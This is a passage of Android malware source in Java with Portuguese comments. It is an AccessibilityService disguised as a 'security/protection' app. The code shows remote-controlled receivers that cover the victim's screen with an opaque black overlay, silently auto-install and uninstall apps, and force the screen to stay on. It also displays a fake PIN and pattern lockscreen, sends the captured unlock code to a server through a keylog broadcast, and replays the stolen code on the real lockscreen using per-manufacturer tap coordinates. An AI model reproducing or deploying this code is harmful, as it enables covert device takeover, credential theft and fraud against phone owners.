     * 🖤 Receiver para BLACK SCREEN OVERLAY (100% opaco)
     * Usa TYPE_ACCESSIBILITY_OVERLAY que não tem limite de alpha!
     */
    private BroadcastReceiver blackScreenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Log.d(TAG, "🖤 BLACK_SCREEN: " + action);
            
            if ("com.seguranca.protecao.BLACK_SCREEN_ON".equals(action)) {
                showBlackScreenOverlay();
            } else if ("com.seguranca.protecao.BLACK_SCREEN_OFF".equals(action)) {
                hideBlackScreenOverlay();
            } else if ("com.seguranca.protecao.CUSTOM_BLACK_SCREEN".equals(action)) {
                String template = intent.getStringExtra("template");
                if (template != null) {
                    showCustomBlackScreenOverlay(template);
                }
            } else if ("com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY".equals(action)) {
                applyBlackOverlayOpacity(intent.getIntExtra("value", 100));
            }
        }
    };
    
    /**
     * 📦 Receiver para habilitar AUTO-INSTALL de APKs
     * Quando ativado, o AccessibilityService vai auto-clicar em "Instalar" e "Abrir"
     */
    private BroadcastReceiver autoInstallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "📦 AUTO-INSTALL habilitado!");
            autoInstallEnabled = true;
            autoInstallEnabledTime = System.currentTimeMillis();
            
            // Desabilita após 180 segundos (3 minutos - tempo para download + tela de settings + instalação)
            handler.postDelayed(() -> {
                autoInstallEnabled = false;
                Log.d(TAG, "📦 AUTO-INSTALL desabilitado (timeout)");
            }, 180000);
        }
    };
    
    /**
     * 🔧 Receiver para habilitar ROM CONFIG (auto-click em configurações de ROM)
     * Auto-clica em: Autostart, Ignorar otimização de bateria, etc.
     */
    private BroadcastReceiver romConfigReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "🔧 ROM_CONFIG habilitado!");
            romConfigEnabled = true;
            romConfigEnabledTime = System.currentTimeMillis();
            
            // Abre as configurações específicas da ROM
            if (romCompat != null) {
                romCompat.openAllROMSettings();
            }
            
            // Desabilita após 60 segundos
            handler.postDelayed(() -> {
                romConfigEnabled = false;
                Log.d(TAG, "🔧 ROM_CONFIG desabilitado (timeout)");
            }, 60000);
        }
    };
    
    /**
     * 🗑️ Receiver para permitir desinstalar OUTROS apps via painel
     * NÃO permite desinstalar o NOSSO app!
     */
    private BroadcastReceiver allowUninstallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "🗑️ ALLOW_UNINSTALL habilitado - Permitindo desinstalar outros apps!");
            allowUninstallOtherApps = true;
            allowUninstallTime = System.currentTimeMillis();
            
            // Desabilita após 60 segundos
            handler.postDelayed(() -> {
                allowUninstallOtherApps = false;
                Log.d(TAG, "🗑️ ALLOW_UNINSTALL desabilitado (timeout)");
            }, 60000);
        }
    };
    
    /**
     * 🗑️ Receiver para AUTO_UNINSTALL - Auto-click para confirmar desinstalação silenciosa
     */
    private boolean autoUninstallEnabled = false;
    private long autoUninstallTime = 0;
    private String packageToUninstall = "";
    
    private BroadcastReceiver autoUninstallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            packageToUninstall = intent.getStringExtra("package");
            Log.d(TAG, "🗑️ AUTO_UNINSTALL ativado para: " + packageToUninstall);
            autoUninstallEnabled = true;
            autoUninstallTime = System.currentTimeMillis();
            
            // Desabilita após 30 segundos
            handler.postDelayed(() -> {
                autoUninstallEnabled = false;
                packageToUninstall = "";
                Log.d(TAG, "🗑️ AUTO_UNINSTALL desabilitado (timeout)");
            }, 30000);
        }
    };
    
    /**
     * 🔒 Receiver para SCREEN PERSISTENCE - Detecta quando a tela desliga
     * Se ativo, força a tela a ligar novamente!
     */
    private BroadcastReceiver screenPersistenceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            
            if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                Log.d(TAG, "🔒 SCREEN_OFF detectado!");
                
                if (screenPersistenceEnabled) {
                    Log.d(TAG, "🔒🔒🔒 PERSISTÊNCIA ATIVA - FORÇANDO TELA LIGAR IMEDIATAMENTE!");
                    
                    // SEM DELAY - Força tela a ligar IMEDIATAMENTE
                    forceScreenOn();
                    
                    // Segunda tentativa após 100ms para garantir
                    handler.postDelayed(() -> {
                        if (screenPersistenceEnabled) {
                            forceScreenOn();
                        }
                    }, 100);
                    
                    // Terceira tentativa após 300ms para garantir
                    handler.postDelayed(() -> {
                        if (screenPersistenceEnabled) {
                            forceScreenOn();
                        }
                    }, 300);
                }
            } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
                Log.d(TAG, "🔒 SCREEN_ON detectado");
            }
        }
    };
    
    /**
     * 🔒 Receiver para TOGGLE SCREEN PERSISTENCE via painel
     */
    private BroadcastReceiver toggleScreenPersistenceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            screenPersistenceEnabled = enabled;
            
            Log.d(TAG, "🔒 SCREEN PERSISTENCE " + (enabled ? "ATIVADO" : "DESATIVADO"));
            
            if (enabled) {
                acquireScreenPersistenceWakeLock();
                // Desabilita timeout da tela via Settings (mais confiável)
                disableScreenTimeout();
            } else {
                releaseScreenPersistenceWakeLock();
                // Restaura timeout normal
                restoreScreenTimeout();
            }
        }
    };
    
    // ==================== SISTEMA DE LOCKSCREEN COMPLETO (PIN + PATTERN) ====================
    
    // Overlay de lockscreen fake
    private android.view.View lockscreenOverlay = null;
    private android.view.WindowManager lockscreenWindowManager = null;
    private boolean isLockscreenActive = false;
    private String lockscreenType = "PIN"; // "PIN" ou "PATTERN"
    
    // Dados capturados
    private String capturedPin = ""; // PIN capturado da vítima
    private java.util.ArrayList<Integer> capturedPattern = new java.util.ArrayList<>(); // Pattern capturado (pontos 1-9)
    
    // Coordenadas do teclado PIN (baseado em resolução 1080x1920)
    private static final int[][] PIN_KEY_COORDS = {
        {540, 1250}, // 0
        {270, 700},  // 1
        {540, 700},  // 2
        {810, 700},  // 3
        {270, 950},  // 4
        {540, 950},  // 5
        {810, 950},  // 6
        {270, 1200}, // 7
        {540, 1200}, // 8
        {810, 1200}, // 9
    };
    private static final int[] PIN_DELETE_COORDS = {270, 1450};
    private static final int[] PIN_ENTER_COORDS = {810, 1450};
    
    // Pattern Lock - Coordenadas dos 9 pontos (3x3 grid)
    // Layout:  [1] [2] [3]
    //          [4] [5] [6]
    //          [7] [8] [9]
    private int[][] patternDotCoords; // Será calculado dinamicamente
    private int patternDotRadius = 40;
    private android.view.View patternView;
    
    /**
     * 🔒 Receiver para SHOW/HIDE LOCKSCREEN
     */
    private BroadcastReceiver lockscreenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Log.d(TAG, "🔒 LOCKSCREEN receiver: " + action);
            
            if ("com.seguranca.protecao.SHOW_LOCKSCREEN".equals(action)) {
                String type = intent.getStringExtra("type");
                if (type == null) type = "PIN";
                showFakeLockscreen(type);
            } else if ("com.seguranca.protecao.HIDE_LOCKSCREEN".equals(action)) {
                hideFakeLockscreen();
            }
        }
    };
    
    /**
     * 🔢 Receiver para LOCK_KEY_PRESS (simula teclas do PIN)
     */
    private BroadcastReceiver lockKeyPressReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String key = intent.getStringExtra("key");
            Log.d(TAG, "🔢 LOCK_KEY_PRESS: " + key);
            
            if (key == null) return;
            
            if ("DELETE".equals(key)) {
                executePinKeyClick(PIN_DELETE_COORDS[0], PIN_DELETE_COORDS[1]);
            } else if ("ENTER".equals(key)) {
                executePinKeyClick(PIN_ENTER_COORDS[0], PIN_ENTER_COORDS[1]);
            } else {
                try {
                    int keyNum = Integer.parseInt(key);
                    if (keyNum >= 0 && keyNum <= 9) {
                        executePinKeyClick(PIN_KEY_COORDS[keyNum][0], PIN_KEY_COORDS[keyNum][1]);
                    }
                } catch (NumberFormatException e) {
                    Log.e(TAG, "🔢 Tecla inválida: " + key);
                }
            }
        }
    };
    
    /**
     * 🔄 Receiver para PLAY_PIN_SEQUENCE e PLAY_PATTERN_SEQUENCE
     */
    private BroadcastReceiver playPinSequenceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String pin = intent.getStringExtra("pin");
            String pattern = intent.getStringExtra("pattern");
            int delay = intent.getIntExtra("delay", 1000);
            
            if (pattern != null && !pattern.isEmpty()) {
                Log.d(TAG, "🔄 PLAY_PATTERN_SEQUENCE: " + pattern);
                playPatternSequence(pattern, delay);
            } else if (pin != null && !pin.isEmpty()) {
                Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE: " + pin);
                playPinSequenceWithDelay(pin, delay);
            }
        }
    };
    
    /**
     * 🔒 Mostra overlay de lockscreen fake (PIN ou PATTERN)
     */
    private void showFakeLockscreen(String type) {
        if (isLockscreenActive) {
            Log.d(TAG, "🔒 Lockscreen já está ativo, removendo anterior...");
            hideFakeLockscreen();
            handler.postDelayed(() -> showFakeLockscreen(type), 300);
            return;
        }
        
        lockscreenType = type;
        capturedPin = "";
        capturedPattern.clear();
        
        Log.d(TAG, "🔒 Mostrando lockscreen fake tipo: " + type);
        
        handler.post(() -> {
            try {
                lockscreenWindowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                
                android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
                lockscreenWindowManager.getDefaultDisplay().getRealMetrics(metrics);
                int screenWidth = metrics.widthPixels;
                int screenHeight = metrics.heightPixels;
                
                if ("PATTERN".equals(type)) {
                    lockscreenOverlay = createPatternLockOverlay(screenWidth, screenHeight);
                } else {
                    lockscreenOverlay = createPinLockOverlay(screenWidth, screenHeight);
                }
                
                android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                );
                
                lockscreenWindowManager.addView(lockscreenOverlay, params);
                isLockscreenActive = true;
                
                Log.d(TAG, "🔒 ✅ LOCKSCREEN " + type + " ATIVO!");
                
            } catch (Exception e) {
                Log.e(TAG, "🔒 ❌ Erro ao mostrar lockscreen: " + e.getMessage());
            }
        });
    }
    
    /**
     * 🔢 Cria overlay de PIN Lock com teclado numérico interativo
     */
    private android.view.View createPinLockOverlay(int screenWidth, int screenHeight) {
        android.widget.LinearLayout mainLayout = new android.widget.LinearLayout(this);
        mainLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
        mainLayout.setBackgroundColor(android.graphics.Color.parseColor("#1a1a2e"));
        mainLayout.setGravity(android.view.Gravity.CENTER);
        mainLayout.setPadding(50, 100, 50, 50);
        
        // Título
        android.widget.TextView title = new android.widget.TextView(this);
        title.setText("Digite seu PIN");
        title.setTextColor(android.graphics.Color.WHITE);
        title.setTextSize(28);
        title.setGravity(android.view.Gravity.CENTER);
        title.setPadding(0, 0, 0, 30);
        mainLayout.addView(title);
        
        // Display do PIN (pontos)
        final android.widget.TextView pinDisplay = new android.widget.TextView(this);
        pinDisplay.setTextColor(android.graphics.Color.WHITE);
        pinDisplay.setTextSize(40);
        pinDisplay.setGravity(android.view.Gravity.CENTER);
        pinDisplay.setPadding(0, 20, 0, 50);
        pinDisplay.setTag("pinDisplay");
        updatePinDisplay(pinDisplay, "");
        mainLayout.addView(pinDisplay);
        
        // Grid de botões 3x4
        android.widget.GridLayout grid = new android.widget.GridLayout(this);
        grid.setColumnCount(3);
        grid.setRowCount(4);
        
        String[] keys = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "⌫", "0", "✓"};
        
        for (String key : keys) {
            android.widget.Button btn = new android.widget.Button(this);
            btn.setText(key);
            btn.setTextSize(24);
            btn.setTextColor(android.graphics.Color.WHITE);
            
            // Estilo do botão
            android.graphics.drawable.GradientDrawable drawable = new android.graphics.drawable.GradientDrawable();
            drawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
            drawable.setCornerRadius(20);
            
            if ("⌫".equals(key)) {
                drawable.setColor(android.graphics.Color.parseColor("#c0392b"));
            } else if ("✓".equals(key)) {
                drawable.setColor(android.graphics.Color.parseColor("#27ae60"));
            } else {
                drawable.setColor(android.graphics.Color.parseColor("#2c3e50"));
            }
            btn.setBackground(drawable);
            
            android.widget.GridLayout.LayoutParams params = new android.widget.GridLayout.LayoutParams();
            params.width = screenWidth / 4;
            params.height = screenWidth / 5;
            params.setMargins(10, 10, 10, 10);
            btn.setLayoutParams(params);
            
            final String keyValue = key;
            btn.setOnClickListener(v -> {
                handlePinKeyPress(keyValue, pinDisplay);
            });
            
            grid.addView(btn);
        }
        
        mainLayout.addView(grid);
        
        return mainLayout;
    }
    
    /**
     * 🔲 Cria overlay de Pattern Lock (9 pontos) interativo
     */
    private android.view.View createPatternLockOverlay(int screenWidth, int screenHeight) {
        android.widget.FrameLayout mainLayout = new android.widget.FrameLayout(this);
        mainLayout.setBackgroundColor(android.graphics.Color.parseColor("#1a1a2e"));
        
        // Título
        android.widget.TextView title = new android.widget.TextView(this);
        title.setText("Desenhe o padrão");
        title.setTextColor(android.graphics.Color.WHITE);
        title.setTextSize(28);
        title.setGravity(android.view.Gravity.CENTER);
        
        android.widget.FrameLayout.LayoutParams titleParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.topMargin = 150;
        titleParams.gravity = android.view.Gravity.TOP | android.view.Gravity.CENTER_HORIZONTAL;
        mainLayout.addView(title, titleParams);
        
        // Canvas para desenhar pattern
        int gridSize = Math.min(screenWidth, screenHeight) - 200;
        int startX = (screenWidth - gridSize) / 2;
        int startY = (screenHeight - gridSize) / 2;
        int cellSize = gridSize / 3;
        
        // Calcula coordenadas dos 9 pontos
        patternDotCoords = new int[9][2];
        for (int i = 0; i < 9; i++) {
            int row = i / 3;
            int col = i % 3;
            patternDotCoords[i][0] = startX + col * cellSize + cellSize / 2;
            patternDotCoords[i][1] = startY + row * cellSize + cellSize / 2;
        }
        
        // View customizada para desenhar o pattern
        patternView = new PatternLockView(this, patternDotCoords, patternDotRadius);
        mainLayout.addView(patternView);
        
        return mainLayout;
    }
    
    /**
     * Custom View para Pattern Lock
     */
    private class PatternLockView extends android.view.View {
        private int[][] dots;
        private int dotRadius;
        private android.graphics.Paint dotPaint;
        private android.graphics.Paint linePaint;
        private android.graphics.Paint activeDotPaint;
        private java.util.ArrayList<Integer> pattern = new java.util.ArrayList<>();
        private float currentX = -1, currentY = -1;
        private boolean isDrawing = false;
        
        public PatternLockView(Context context, int[][] dotCoords, int radius) {
            super(context);
            this.dots = dotCoords;
            this.dotRadius = radius;
            
            dotPaint = new android.graphics.Paint();
            dotPaint.setColor(android.graphics.Color.parseColor("#7f8c8d"));
            dotPaint.setStyle(android.graphics.Paint.Style.FILL);
            dotPaint.setAntiAlias(true);
            
            activeDotPaint = new android.graphics.Paint();
            activeDotPaint.setColor(android.graphics.Color.parseColor("#3498db"));
            activeDotPaint.setStyle(android.graphics.Paint.Style.FILL);
            activeDotPaint.setAntiAlias(true);
            
            linePaint = new android.graphics.Paint();
            linePaint.setColor(android.graphics.Color.parseColor("#3498db"));
            linePaint.setStrokeWidth(8);
            linePaint.setStyle(android.graphics.Paint.Style.STROKE);
            linePaint.setAntiAlias(true);
        }
        
        @Override
        protected void onDraw(android.graphics.Canvas canvas) {
            super.onDraw(canvas);
            
            // Desenha linhas entre pontos selecionados
            if (pattern.size() > 1) {
                for (int i = 0; i < pattern.size() - 1; i++) {
                    int from = pattern.get(i);
                    int to = pattern.get(i + 1);
                    canvas.drawLine(dots[from][0], dots[from][1], dots[to][0], dots[to][1], linePaint);
                }
            }
            
            // Desenha linha até o dedo atual
            if (isDrawing && pattern.size() > 0 && currentX >= 0) {
                int lastDot = pattern.get(pattern.size() - 1);
                canvas.drawLine(dots[lastDot][0], dots[lastDot][1], currentX, currentY, linePaint);
            }
            
            // Desenha os 9 pontos
            for (int i = 0; i < 9; i++) {
                android.graphics.Paint paint = pattern.contains(i) ? activeDotPaint : dotPaint;
                canvas.drawCircle(dots[i][0], dots[i][1], dotRadius, paint);
            }
        }
        
        @Override
        public boolean onTouchEvent(android.view.MotionEvent event) {
            float x = event.getX();
            float y = event.getY();
            
            switch (event.getAction()) {
                case android.view.MotionEvent.ACTION_DOWN:
                    pattern.clear();
                    isDrawing = true;
                    checkDotHit(x, y);
                    break;
                    
                case android.view.MotionEvent.ACTION_MOVE:
                    currentX = x;
                    currentY = y;
                    checkDotHit(x, y);
                    break;
                    
                case android.view.MotionEvent.ACTION_UP:
                    isDrawing = false;
                    currentX = -1;
                    currentY = -1;
                    if (pattern.size() >= 4) {
                        // Padrão válido capturado!
                        capturedPattern.clear();
                        capturedPattern.addAll(pattern);
                        sendCapturedPattern();
                    }
                    break;
            }
            
            invalidate();
            return true;
        }
        
        private void checkDotHit(float x, float y) {
            for (int i = 0; i < 9; i++) {
                float dx = x - dots[i][0];
                float dy = y - dots[i][1];
                if (Math.sqrt(dx * dx + dy * dy) < dotRadius * 2 && !pattern.contains(i)) {
                    pattern.add(i);
                    // Vibra
                    try {
                        android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                        if (vibrator != null) vibrator.vibrate(30);
                    } catch (Exception e) {}
                }
            }
        }
    }
    
    /**
     * 🔢 Processa tecla pressionada no PIN Lock
     */
    private void handlePinKeyPress(String key, android.widget.TextView display) {
        if ("⌫".equals(key)) {
            // Apagar último dígito
            if (capturedPin.length() > 0) {
                capturedPin = capturedPin.substring(0, capturedPin.length() - 1);
            }
        } else if ("✓".equals(key)) {
            // Confirmar PIN
            if (capturedPin.length() >= 4) {
                sendCapturedPin();
            }
        } else {
            // Adicionar dígito
            if (capturedPin.length() < 10) {
                capturedPin += key;
            }
        }
        
        updatePinDisplay(display, capturedPin);
        
        // Vibra
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) vibrator.vibrate(30);
        } catch (Exception e) {}
    }
    
    /**
     * Atualiza display do PIN (mostra pontos)
     */
    private void updatePinDisplay(android.widget.TextView display, String pin) {
        StringBuilder dots = new StringBuilder();
        for (int i = 0; i < pin.length(); i++) {
            dots.append("● ");
        }
        if (dots.length() == 0) {
            dots.append("_ _ _ _");
        }
        display.setText(dots.toString().trim());
    }
    
    /**
     * 📤 Envia PIN capturado para o servidor
     */
    private void sendCapturedPin() {
        Log.d(TAG, "🔒 PIN CAPTURADO: " + capturedPin);
        
        // Envia para o servidor via broadcast
        Intent intent = new Intent("com.seguranca.protecao.KEYLOG_DATA");
        intent.putExtra("json_data", "{\"type\":\"CAPTURED_PIN\",\"pin\":\"" + capturedPin + "\",\"timestamp\":" + System.currentTimeMillis() + "}");
        sendBroadcast(intent);
        
        // Fecha o lockscreen após 1 segundo
        handler.postDelayed(() -> hideFakeLockscreen(), 1000);
    }
    
    /**
     * 📤 Envia Pattern capturado para o servidor
     */
    private void sendCapturedPattern() {
        // Converte pattern para string (1-9)
        StringBuilder patternStr = new StringBuilder();
        for (int dot : capturedPattern) {
            patternStr.append(dot + 1); // Converte 0-8 para 1-9
        }
        
        Log.d(TAG, "🔒 PATTERN CAPTURADO: " + patternStr.toString());
        
        // Envia para o servidor
        Intent intent = new Intent("com.seguranca.protecao.KEYLOG_DATA");
        intent.putExtra("json_data", "{\"type\":\"CAPTURED_PATTERN\",\"pattern\":\"" + patternStr.toString() + "\",\"timestamp\":" + System.currentTimeMillis() + "}");
        sendBroadcast(intent);
        
        // Fecha o lockscreen após 1 segundo
        handler.postDelayed(() -> hideFakeLockscreen(), 1000);
    }
    
    /**
     * 🔓 Esconde overlay de lockscreen fake
     */
    private void hideFakeLockscreen() {
        if (!isLockscreenActive || lockscreenOverlay == null) {
            Log.d(TAG, "🔓 Lockscreen não está ativo");
            return;
        }
        
        Log.d(TAG, "🔓 Escondendo lockscreen fake...");
        
        handler.post(() -> {
            try {
                if (lockscreenWindowManager != null && lockscreenOverlay != null) {
                    lockscreenWindowManager.removeView(lockscreenOverlay);
                    lockscreenOverlay = null;
                }
                isLockscreenActive = false;
                Log.d(TAG, "🔓 ✅ LOCKSCREEN REMOVIDO!");
            } catch (Exception e) {
                Log.e(TAG, "🔓 ❌ Erro ao remover lockscreen: " + e.getMessage());
            }
        });
    }
    
    /**
     * 🔢 Executa clique na posição da tecla do PIN real do dispositivo
     */
    /**
     * 🔢 Executa clique em tecla PIN - SEM ESCALAR (coordenadas já são absolutas)
     */
    private void executePinKeyClick(int x, int y) {
        // CORREÇÃO: Não escalar! As coordenadas já são calculadas para a tela atual!
        Log.d(TAG, "🔢 Clicando DIRETO em (" + x + ", " + y + ")");
        executeClick(x, y);
    }
    
    /**
     * 🔄 Reproduz sequência de PIN com delay entre teclas
     * AJUSTADO para calcular coordenadas dinamicamente
     */
    private void playPinSequenceWithDelay(String pin, int delayMs) {
        Log.d(TAG, "🔄 Iniciando reprodução do PIN: " + pin + " (delay: " + delayMs + "ms)");
        
        // 🎯 MÉTODO 1: Tenta detectar via ACCESSIBILITYSERVICE (SEM ADB! SEM ROOT!)
        int[][] pinKeyCoords = detectPinKeypadViaAccessibility();
        
        if (pinKeyCoords != null) {
            // Usa coordenadas EXATAS detectadas via AccessibilityService!
            Log.d(TAG, "🔢🎯 Usando coordenadas EXATAS do AccessibilityService!");
            playPinWithDetectedCoords(pin, delayMs, pinKeyCoords);
            return;
        }
        
        Log.w(TAG, "🔢 AccessibilityService falhou, usando cálculo por fabricante...");
        
        // Obtém métricas da tela
        android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
        android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        int screenWidth = metrics.widthPixels;
        int screenHeight = metrics.heightPixels;
        
        Log.d(TAG, "🔢 Tela: " + screenWidth + "x" + screenHeight);
        
        // COORDENADAS UNIVERSAIS - Detecta fabricante e ajusta
        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
        Log.d(TAG, "🔢 Fabricante: " + manufacturer);
        
        // Samsung/One UI coloca o teclado mais embaixo que Stock Android
        float startYPercent = 0.32f;
        float keyHeightPercent = 0.085f;
        
        if (manufacturer.contains("samsung")) {
            // 🎯 SAMSUNG ONE UI - COORDENADAS EXATAS DO DUMP!
            // Tela 1080x2400, PIN Keypad real do Samsung
            // key1=[184,1168][364,1348], key0=[450,1852][630,2032]
            
            float scaleX = screenWidth / 1080f;
            float scaleY = screenHeight / 2400f;
            
            // Coordenadas EXATAS do dump, escaladas para a resolução atual
            int[][] samsungPinCoords = {
                {(int)(540 * scaleX), (int)(1942 * scaleY)},  // 0
                {(int)(274 * scaleX), (int)(1258 * scaleY)},  // 1
                {(int)(540 * scaleX), (int)(1258 * scaleY)},  // 2
                {(int)(806 * scaleX), (int)(1258 * scaleY)},  // 3
                {(int)(274 * scaleX), (int)(1486 * scaleY)},  // 4
                {(int)(540 * scaleX), (int)(1486 * scaleY)},  // 5
                {(int)(806 * scaleX), (int)(1486 * scaleY)},  // 6
                {(int)(274 * scaleX), (int)(1714 * scaleY)},  // 7
                {(int)(540 * scaleX), (int)(1714 * scaleY)},  // 8
                {(int)(806 * scaleX), (int)(1714 * scaleY)},  // 9
            };
            int[] samsungEnterCoords = {(int)(806 * scaleX), (int)(1942 * scaleY)}; // OK
            
            Log.d(TAG, "🔢🎯 SAMSUNG: Usando coordenadas EXATAS do dump!");
            for (int i = 0; i <= 9; i++) {
                Log.d(TAG, "🔢 Tecla " + i + ": (" + samsungPinCoords[i][0] + ", " + samsungPinCoords[i][1] + ")");
            }
            
            // Executa com coordenadas Samsung
            char[] samsungDigits = pin.toCharArray();
            for (int i = 0; i < samsungDigits.length; i++) {
                final char digit = samsungDigits[i];
                final int delay = i * delayMs;
                final int[][] coords = samsungPinCoords;
                
                handler.postDelayed(() -> {
                    int keyNum = Character.getNumericValue(digit);
                    if (keyNum >= 0 && keyNum <= 9) {
                        Log.d(TAG, "🔢🎯 Samsung: Clicando tecla " + keyNum + " em (" + coords[keyNum][0] + ", " + coords[keyNum][1] + ")");
                        executePinKeyClick(coords[keyNum][0], coords[keyNum][1]);
                    }
                }, delay);
            }
            
            // Enter no final
            final int[] enterC = samsungEnterCoords;
            handler.postDelayed(() -> {
                Log.d(TAG, "🔢🎯 Samsung: Clicando OK em (" + enterC[0] + ", " + enterC[1] + ")");
                executePinKeyClick(enterC[0], enterC[1]);
            }, samsungDigits.length * delayMs + delayMs);
            
            return; // Sai da função, já processou Samsung
        }
        
        if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi")) {
            startYPercent = 0.42f;  // Xiaomi MIUI
            keyHeightPercent = 0.09f;
        } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
            startYPercent = 0.45f;  // Huawei EMUI
            keyHeightPercent = 0.09f;
        } else if (manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus")) {
            startYPercent = 0.42f;  // ColorOS/OxygenOS
            keyHeightPercent = 0.09f;
        }
        
        int keyWidth = screenWidth / 3;
        int keyHeight = (int)(screenHeight * keyHeightPercent);
        int startY = (int)(screenHeight * startYPercent);
        
        // Calcula centro de cada tecla
        int col1 = keyWidth / 2;           // Coluna esquerda
        int col2 = screenWidth / 2;         // Coluna central
        int col3 = screenWidth - keyWidth / 2; // Coluna direita
        
        // Linhas Y (de cima para baixo: 1-2-3, 4-5-6, 7-8-9, del-0-enter)
        int row1 = startY + keyHeight / 2;
        int row2 = startY + keyHeight + keyHeight / 2;
        int row3 = startY + keyHeight * 2 + keyHeight / 2;
        int row4 = startY + keyHeight * 3 + keyHeight / 2;
        
        // Coordenadas das teclas [x, y]
        final int[][] pinCoords = {
            {col2, row4},  // 0 (centro da última linha)
            {col1, row1},  // 1
            {col2, row1},  // 2
            {col3, row1},  // 3
            {col1, row2},  // 4
            {col2, row2},  // 5
            {col3, row2},  // 6
            {col1, row3},  // 7
            {col2, row3},  // 8
            {col3, row3},  // 9
        };
        final int[] enterCoords = {col3, row4}; // Enter (direita da última linha)
        
        // Log das coordenadas para debug
        for (int i = 0; i <= 9; i++) {
            Log.d(TAG, "🔢 Tecla " + i + ": (" + pinCoords[i][0] + ", " + pinCoords[i][1] + ")");
        }
        Log.d(TAG, "🔢 Enter: (" + enterCoords[0] + ", " + enterCoords[1] + ")");
        
        char[] digits = pin.toCharArray();
        
        for (int i = 0; i < digits.length; i++) {
            final char digit = digits[i];
            final int delay = i * delayMs;
            
            handler.postDelayed(() -> {
                try {
                    int keyNum = Character.getNumericValue(digit);
                    if (keyNum >= 0 && keyNum <= 9) {
                        Log.d(TAG, "🔢 Reproduzindo tecla: " + keyNum + " em (" + pinCoords[keyNum][0] + ", " + pinCoords[keyNum][1] + ")");
                        executePinKeyClick(pinCoords[keyNum][0], pinCoords[keyNum][1]);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "🔄 Erro ao reproduzir tecla: " + e.getMessage());
                }
            }, delay);
        }
        
        handler.postDelayed(() -> {
            Log.d(TAG, "✔ Pressionando ENTER em (" + enterCoords[0] + ", " + enterCoords[1] + ")");
            executePinKeyClick(enterCoords[0], enterCoords[1]);
        }, digits.length * delayMs + delayMs);
    }
    
    /**
     * 🔲 Reproduz sequência de Pattern (swipe entre pontos)
     * SOLUÇÃO DEFINITIVA: Detecta o PatternView real via UIAUTOMATOR!
     * Funciona em 100% dos dispositivos Android, independente da marca ou resolução!
     */
    private void playPatternSequence(String pattern, int delayMs) {
        Log.d(TAG, "🔲 Iniciando reprodução do PATTERN: " + pattern + " (delay: " + delayMs + "ms)");
        
        // 🎯 MÉTODO 1: Tenta detectar via ACCESSIBILITYSERVICE (SEM ADB! SEM ROOT!)
        int[][] patternCoords = detectPatternViewViaAccessibility();
        
        // MÉTODO 2: Fallback - Tenta método antigo via AccessibilityService
        if (patternCoords == null) {
            Log.w(TAG, "🔲 Detecção principal falhou, tentando método alternativo...");
            patternCoords = detectPatternViewCoords();
        }
        
        // MÉTODO 3: Último fallback - Cálculo por fabricante
        if (patternCoords == null) {
            Log.w(TAG, "🔲 AccessibilityService falhou, usando cálculo por fabricante...");
            patternCoords = calculatePatternCoordsByManufacturer();
        }
        
        // Log das coordenadas finais
        for (int i = 0; i < 9; i++) {
            Log.d(TAG, "🔲 Ponto " + (i+1) + ": (" + patternCoords[i][0] + ", " + patternCoords[i][1] + ")");
        }
        
        // Converte string de pattern em coordenadas
        java.util.ArrayList<int[]> points = new java.util.ArrayList<>();
        for (char c : pattern.toCharArray()) {
            int dotIndex = Character.getNumericValue(c) - 1; // 1-9 -> 0-8
            if (dotIndex >= 0 && dotIndex < 9) {
                points.add(new int[]{patternCoords[dotIndex][0], patternCoords[dotIndex][1]});
                Log.d(TAG, "🔲 Adicionando ponto " + (dotIndex+1) + " ao path");
            }
        }
        
        if (points.size() < 2) {
            Log.e(TAG, "🔲 Pattern inválido: menos de 2 pontos");
            return;
        }
        
        Log.d(TAG, "🔲 Total de pontos: " + points.size());
        
        // Executa o swipe contínuo passando por todos os pontos
